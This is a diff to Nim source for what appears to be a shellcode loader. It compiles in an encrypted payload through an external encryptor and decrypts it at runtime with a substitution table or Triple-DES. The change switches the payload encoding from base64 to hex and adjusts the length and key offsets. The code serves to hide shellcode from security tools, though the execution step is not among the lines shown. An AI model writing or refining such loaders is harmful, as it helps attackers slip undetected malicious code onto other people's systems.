@@ -1,8 +1,7 @@
 {.passL:"-static"}
 # {.hint[XDeclaredButNotUsed]:off.}
 # {.passL:"-D:_WIN32_WINNT=0x0602"}
-{.compile: "encryption\\des.c".}
-import base64
+import strutils
 
 const source {.strdefine.}: string = ""
 var code*:cstring
@@ -12,7 +11,7 @@ const currsource:string = "\"" & source & "\""
 when defined(Caesar):
     import sequtils
     proc caesar(result:string): void =
-        let decodres = decode(result)
+        let decodres = parseHexStr(result)
         let dic = decodres[0..255].mapIt(it.byte)
         let table = decodres[256..high(decodres)].mapIt(it.byte)
         var deshellcode = newSeq[uint8](table.len)
@@ -27,14 +26,15 @@ when defined(Caesar):
     caesar(enbase64)
 
 elif defined(TDEA):
+    {.compile: "encryption\\des.c".}
     proc D3DES_Decrypt(plainBuffer:cstring,keyBuffer:cstring,cipherBuffer:cstring,n:cint):cint {.importc,cdecl.}
     proc de3des(enbase64:string): void =
-        let shellcode:string = decode(enbase64) 
-        let plain_len_byte = cast[int16]([shellcode[0],shellcode[1]])
-        let input_encode:cstring = cstring(shellcode[26..high(shellcode)])
-        let key:cstring = cstring(shellcode[2..25])
+        let shellcode:string = parseHexStr(enbase64)
+        let plain_len_byte = cast[uint32]([shellcode[0],shellcode[1],shellcode[2],shellcode[3]])
+        let input_encode:cstring = cstring(shellcode[28..high(shellcode)])
+        let key:cstring = cstring(shellcode[4..27])
         code = cast[cstring](alloc0(plain_len_byte));
         discard D3DES_Decrypt(input_encode,key,code,cast[cint](plain_len_byte))
-        codelen = plain_len_byte
+        codelen = cast[cint](plain_len_byte)
     const enbase64 = staticExec("encryption\\Tdea.exe " & currsource)
     de3des(enbase64)
